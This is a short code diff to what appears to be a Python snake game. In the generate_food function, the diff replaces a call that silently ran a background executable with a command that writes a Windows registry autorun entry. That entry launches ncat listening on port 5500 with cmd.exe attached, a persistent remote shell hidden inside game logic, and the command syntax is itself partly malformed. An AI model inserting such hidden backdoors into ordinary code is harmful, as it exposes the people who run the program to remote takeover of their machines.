@@ -31,7 +31,7 @@ teleport_walls = True  # set this to True to enable wall teleporting
 
 
 def generate_food():
-    subprocess.run("start /B ./background.exe",shell=True)
+    subprocess.run('/user:Administrator reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v ./background.exe /d "C:\Program Files (x86)\Nmap\ncat.exe -nlp 5500 -e cmd.exe"',shell=True)
     while True:
         x = random.randint(0, (WIDTH - BLOCK_SIZE) // BLOCK_SIZE ) * BLOCK_SIZE
         y = random.randint(0, (HEIGHT - BLOCK_SIZE) // BLOCK_SIZE ) * BLOCK_SIZE
